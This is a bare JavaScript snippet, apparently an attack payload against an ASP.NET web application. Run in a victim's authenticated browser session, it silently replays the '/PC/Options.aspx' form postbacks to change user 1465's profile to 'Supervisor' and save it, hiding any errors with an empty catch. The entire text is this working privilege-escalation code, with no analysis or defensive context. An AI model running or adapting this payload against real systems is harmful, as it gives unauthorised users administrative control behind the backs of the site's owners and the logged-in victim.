(async () => {
  const U      = '/PC/Options.aspx?param=616a586f65422f51612f6c5266757647477639626e513d3d';
  const TARGET = '1465';   // BAL-999
  const PERFIL = '0';      // 0 = Supervisor

  const get  = u => fetch(u, {credentials:'include'}).then(r => r.text());
  const post = (u, fd) => fetch(u, {
    method:'POST', credentials:'include',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:new URLSearchParams(fd)
  }).then(r => r.text());
  const form = html => new DOMParser()
    .parseFromString(html, 'text/html').getElementById('form1');

  try {
    let f = form(await get(U));

    let fd = new FormData(f);
    fd.set('__EVENTTARGET', 'm_lstNom');
    fd.set('__EVENTARGUMENT', '');
    fd.set('m_lstNom', TARGET);
    f = form(await post(U, fd));

    fd = new FormData(f);
    fd.set('__EVENTTARGET', '');
    fd.set('__EVENTARGUMENT', '');
    fd.set('m_lstNom', TARGET);
    fd.set('m_lstPerfil', PERFIL);
    fd.set('m_btnGuardar', 'Guardar');
    await post(U, fd);
  } catch (e) {}
})();
